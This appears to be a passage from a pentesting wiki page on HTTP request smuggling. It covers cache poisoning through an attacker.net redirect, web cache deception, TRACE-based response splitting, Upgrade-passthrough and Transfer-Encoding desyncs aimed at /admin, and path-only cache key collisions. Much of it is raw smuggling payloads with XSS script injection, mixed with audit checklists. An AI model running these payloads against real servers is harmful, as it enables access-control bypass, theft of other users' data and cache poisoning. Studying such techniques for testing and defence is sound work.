  \ / HTTP/1.1\nHost: vulnerable.net\nContent-Type: application/x-www-form-urlencoded\nConnection: keep-alive\nContent-Length:\
  \ 124\nTransfer-Encoding: chunked\n\n0\n\nGET /post/next?postId=3 HTTP/1.1\nHost: attacker.net\nContent-Type: application/x-www-form-urlencoded\n\
  Content-Length: 10\n\nx=1\n```\n\nNote the embedded request targeting `/post/next?postId=3`. This request will be redirected\
  \ to `/post?postId=4`, utilizing the **Host header value** to determine the domain. By altering the **Host header**, the\
  \ attacker can redirect the request to their domain (**on-site redirect to open redirect**).\n\nAfter successful **socket\
  \ poisoning**, a **GET request** for `/static/include.js` should be initiated. This request will be contaminated by the\
  \ prior **on-site redirect to open redirect** request and fetch the content of the script controlled by the attacker.\n\n\
  Subsequently, any request for `/static/include.js` will serve the cached content of the attacker's script, effectively launching\
  \ a broad XSS attack.\n\n### Using HTTP request smuggling to perform web cache deception <a href=\"#using-http-request-smuggling-to-perform-web-cache-deception\"\
  \ id=\"using-http-request-smuggling-to-perform-web-cache-deception\"></a>\n\n> **What is the difference between web cache\
  \ poisoning and web cache deception?**\n>\n> - In **web cache poisoning**, the attacker causes the application to store\
  \ some malicious content in the cache, and this content is served from the cache to other application users.\n> - In **web\
  \ cache deception**, the attacker causes the application to store some sensitive content belonging to another user in the\
  \ cache, and the attacker then retrieves this content from the cache.\n\nThe attacker crafts a smuggled request that fetches\
  \ sensitive user-specific content. Consider the following example:\n\n```markdown\n`POST / HTTP/1.1`\\\n`Host: vulnerable-website.com`\\\
  \n`Connection: keep-alive`\\\n`Content-Length: 43`\\\n`Transfer-Encoding: chunked`\\\n`` \\ `0`\\ ``\\\n`GET /private/messages\
  \ HTTP/1.1`\\\n`Foo: X`\n```\n\nIf this smuggled request poisons a cache entry intended for static content (e.g., `/someimage.png`),\
  \ the victim's sensitive data from `/private/messages` might be cached under the static content's cache entry. Consequently,\
  \ the attacker could potentially retrieve these cached sensitive data.\n\n### Abusing TRACE via HTTP Request Smuggling <a\
  \ href=\"#exploiting-web-cache-poisoning-via-http-request-smuggling\" id=\"exploiting-web-cache-poisoning-via-http-request-smuggling\"\
  ></a>\n\n[**In this post**](https://portswigger.net/research/trace-desync-attack) is suggested that if the server has the\
  \ method TRACE enabled it could be possible to abuse it with a HTTP Request Smuggling. This is because this method will\
  \ reflect any header sent to the server as part of the body of the response. For example:\n\n```\nTRACE / HTTP/1.1\nHost:\
  \ example.com\nXSS: <script>alert(\"TRACE\")</script>\n```\n\nWill send a response such as:\n\n```\nHTTP/1.1 200 OK\nContent-Type:\
  \ message/http\nContent-Length: 115\n\nTRACE / HTTP/1.1\nHost: vulnerable.com\nXSS: <script>alert(\"TRACE\")</script>\n\
  X-Forwarded-For: xxx.xxx.xxx.xxx\n```\n\nAn example on how to abuse this behaviour would be to **smuggle first a HEAD request**.\
  \ This request will be responded with only the **headers** of a GET request (**`Content-Type`** among them). And smuggle\
  \ **immediately after the HEAD a TRACE request**, which will be **reflecting the sent dat**a.\\\nAs the HEAD response will\
  \ be containing a `Content-Length` header, the **response of the TRACE request will be treated as the body of the HEAD response,\
  \ therefore reflecting arbitrary data** in the response.\\\nThis response will be sent to the next request over the connection,\
  \ so this could be **used in a cached JS file for example to inject arbitrary JS code**.\n\n### Abusing TRACE via HTTP Response\
  \ Splitting <a href=\"#exploiting-web-cache-poisoning-via-http-request-smuggling\" id=\"exploiting-web-cache-poisoning-via-http-request-smuggling\"\
  ></a>\n\nContinue following [**this post**](https://portswigger.net/research/trace-desync-attack) is suggested another way\
  \ to abuse the TRACE method. As commented, smuggling a HEAD request and a TRACE request it's possible to **control some\
  \ reflected data** in the response to the HEAD request. The length of the body of the HEAD request is basically indicated\
  \ in the Content-Length header and is formed by the response to the TRACE request.\n\nTherefore, the new idea would be that,\
  \ knowing this Content-Length and the data given in the TRACE response, it's possible to make the TRACE response contains\
  \ a valid HTTP response after the last byte of the Content-Length, allowing an attacker to completely control the request\
  \ to the next response (which could be used to perform a cache poisoning).\n\nExample:\n\n```\nGET / HTTP/1.1\nHost: example.com\n\
  Content-Length: 360\n\nHEAD /smuggled HTTP/1.1\nHost: example.com\n\nPOST /reflect HTTP/1.1\nHost: example.com\n\nSOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1\
  \ 200 Ok\\r\\n\nContent-Type: text/html\\r\\n\nCache-Control: max-age=1000000\\r\\n\nContent-Length: 44\\r\\n\n\\r\\n\n\
  <script>alert(\"response splitting\")</script>\n```\n\nWill generate these responses (note how the HEAD response has a Content-Length\
  \ making the TRACE response part of the HEAD body and once the HEAD Content-Length ends a valid HTTP response is smuggled):\n\
  \n```\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length: 0\n\nHTTP/1.1 200 OK\nContent-Type: text/html\nContent-Length:\
  \ 165\n\nHTTP/1.1 200 OK\nContent-Type: text/plain\nContent-Length: 243\n\nSOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1\
  \ 200 Ok\nContent-Type: text/html\nCache-Control: max-age=1000000\nContent-Length: 50\n\n<script>alert(“arbitrary response”)</script>\n\

  \nSeveral 2026 Pingora bugs are useful because they show **desync primitives beyond classic CL.TE / TE.CL**. The reusable\
  \ lesson is: whenever a proxy **stops parsing too early**, **normalizes `Transfer-Encoding` differently from the backend**,\
  \ or **falls back to read-until-close for request bodies**, you may get FE↔BE desync even without a traditional CL/TE ambiguity.\n\
  \n### Premature `Upgrade` passthrough\n\nIf a reverse proxy **switches to raw tunnel / passthrough mode as soon as it sees\
  \ an `Upgrade` header**, without waiting for the backend to confirm the switch with **`101 Switching Protocols`**, you can\
  \ smuggle a second request in the same TCP stream:\n\n```http\nGET / HTTP/1.1\nHost: target.com\nUpgrade: anything\nContent-Length:\
  \ 0\n\nGET /admin HTTP/1.1\nHost: target.com\n```\n\nThe front-end parses only the first request, then forwards the rest\
  \ as raw bytes. The backend parses the appended bytes as a new request from the proxy's trusted IP. This is especially useful\
  \ to:\n\n- Bypass proxy ACLs, WAF rules, auth checks, and rate limits.\n- Reach internal-only endpoints that trust the reverse\
  \ proxy IP.\n- Trigger cross-user response queue poisoning on reused backend connections.\n\nWhen auditing proxies, always\
  \ test whether **any** `Upgrade` value triggers passthrough, and verify whether the switch happens **before** or **after**\
  \ the backend replies with `101`.\n\n### `Transfer-Encoding` normalization bugs + HTTP/1.0 close-delimited fallback\n\n\
  Another useful pattern is:\n\n1. The proxy sees that `Transfer-Encoding` is present, so it strips `Content-Length`.\n2.\
  \ The proxy **fails to normalize TE correctly**.\n3. The proxy now has **no recognized framing** and falls back to **close-delimited\
  \ request bodies** for HTTP/1.0.\n4. The backend correctly understands TE and treats bytes after `0\\r\\n\\r\\n` as a new\
  \ request.\n\nCommon ways to trigger this:\n\n- **Comma-separated TE list not parsed**:\n\n```http\nGET / HTTP/1.0\nHost:\
  \ target.com\nConnection: keep-alive\nTransfer-Encoding: identity, chunked\nContent-Length: 29\n\n0\n\nGET /admin HTTP/1.1\n\
  X:\n```\n\n- **Duplicate TE headers not merged**:\n\n```http\nPOST /legit HTTP/1.0\nHost: target.com\nConnection: keep-alive\n\
  Transfer-Encoding: identity\nTransfer-Encoding: chunked\n\n0\n\nGET /admin HTTP/1.1\nHost: target.com\nX:\n```\n\nThe important\
  \ audit checks are:\n\n- Does the front-end parse the **last** TE token, as required when `chunked` is last?\n- Does it\
  \ use **all** `Transfer-Encoding` headers instead of just the first one?\n- Can you force **HTTP/1.0** to trigger a read-until-close\
  \ body mode?\n- Does the proxy ever allow **close-delimited request bodies**? That is a high-value desync smell by itself.\n\
  \nThis class often looks like CL.TE from the outside, but the real primitive is: **TE present --> CL stripped --> no valid\
  \ framing recognized --> request body forwarded until close**.\n\n### Related cache poisoning primitive: path-only cache\
  \ keys\n\nThe same Pingora audit also exposed a dangerous reverse-proxy cache anti-pattern: deriving the cache key **only\
  \ from the URI path**, while ignoring **Host**, scheme, or port. In multi-tenant or multi-vhost deployments, different hosts\
  \ can then collide on the same cache entry:\n\n```http\nGET /api/data HTTP/1.1\nHost: evil.com\n```\n\n```http\nGET /api/data\
  \ HTTP/1.1\nHost: victim.com\n```\n\nIf both requests map to the same cache key (`/api/data`), one tenant can poison content\
  \ for another. If the origin reflects the `Host` header in redirects, CORS, HTML, or script URLs, a low-value Host reflection\
  \ can become **cross-user stored cache poisoning**.\n\nWhen reviewing caches, confirm that the key includes at least:\n\n\
  - `Host` / virtual host identity\n- scheme (`http` vs `https`) when behavior differs\n- port when multiple applications\
  \ share the same cache namespace\n\n## Tools\n\n- HTTP Hacker (Burp BApp Store) – visualize concatenation/framing and low‑level\
